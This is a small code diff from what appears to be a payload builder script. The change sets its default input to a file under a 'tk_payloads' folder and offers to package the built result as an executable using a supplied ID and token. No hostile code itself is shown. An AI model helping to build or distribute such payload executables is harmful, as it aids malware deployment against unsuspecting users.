@@ -113,7 +113,8 @@ try:
     if code_addr == "c":
         code_addr = input("write your code address(.py file): ")
         if code_addr.endswith(".py"): pass
-    else: code_addr = "builder/tk_build.py"
+    else: 
+        code_addr = "builder/tk_payloads/password_maker.py"
     make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
